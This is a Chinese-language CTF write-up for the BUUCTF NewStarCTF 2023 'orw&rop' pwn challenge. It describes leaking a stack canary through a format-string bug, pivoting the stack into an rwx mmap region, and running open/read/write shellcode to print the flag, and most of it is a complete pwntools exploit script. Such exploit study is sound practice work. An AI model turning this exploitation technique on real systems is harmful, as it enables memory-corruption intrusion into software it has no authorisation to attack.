---
title: BUUCTF-NewStarCTF-2023-orwrop 题解
date: 2026-01-12 11:40:00
tags: 
    - orw
    - 栈迁移
    - stack
    - pwn
    - BUUCTF
categories: pwn 题解
---
### 题目

[题目链接](https://buuoj.cn/challenges#[NewStarCTF%202023%20%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93]orw&rop)

### checksec

![这是什么鸭](https://pic.ratherhard.com/post/BUUCTF/NewStarCTF-2023-orwrop/checksec.png)

有 canary 保护

### IDA

![这是什么鸭](https://pic.ratherhard.com/post/BUUCTF/NewStarCTF-2023-orwrop/IDA.png)

有沙箱，考虑 orw

可利用格式化字符串漏洞泄露 canary

然后发现 mmap 开了一个 rwx 区域

考虑栈迁移和 ret2shellcode

我们可以在第一次溢出时迁移 rbp 并再次调用溢出漏洞，然后由于 buf 的写入是以 rbp 为基准的，所以在第二次溢出时栈已迁移，可以直接在 rwx 段上布局 shellcode 实现 orw

### exp

```python
from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'

elf = ELF('ezorw')

io = process('./ezorw') 

fmt = b'%11$p'

io.recvuntil(b'sandbox\n')
io.sendline(fmt)

canary = p64(int(io.recv(18), 16))
log.info(f'canary = {hex(u64(canary))}')

io.recvuntil(b'now\n')

rbp_addr = p64(0x66660000 + 0x100)
rsp_s_rip_addr = p64(0x66660000 + 0x100 + 0x10)
read_addr = p64(0x401373)

padding = 40
payload = b'A' * padding + canary + rbp_addr + read_addr
io.sendline(payload)

shellcode = ''
shellcode += shellcraft.open('./flag')
shellcode += shellcraft.read('rax', 'rsp', 0x100)
shellcode += shellcraft.write(1, 'rsp', 0x100)
payload = b'A' * padding + canary + rbp_addr + rsp_s_rip_addr + asm(shellcode)
io.recvuntil(b'now\n')
io.sendline(payload)
all_output = io.recvall(timeout=5)
log.info(all_output.decode('utf-8', errors='ignore'))
```